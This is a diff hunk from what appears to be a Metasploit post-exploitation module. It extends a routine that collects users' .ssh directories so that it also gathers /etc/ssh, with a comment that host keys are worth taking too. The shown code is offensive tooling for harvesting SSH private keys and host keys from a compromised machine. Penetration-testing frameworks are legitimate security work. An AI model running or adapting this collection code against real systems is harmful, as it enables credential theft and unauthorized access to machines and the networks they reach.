@@ -36,6 +36,10 @@ class Metasploit3 < Msf::Post
 	def run
 		print_status("Finding .ssh directories")
 		paths = enum_user_directories.map {|d| d + "/.ssh"}
+
+		# Grab the contents of /etc/ssh as well. A host key is fine too.
+		paths.push('/etc/ssh')
+	
 		# Array#select! is only in 1.9
 		paths = paths.select { |d| directory?(d) }
 
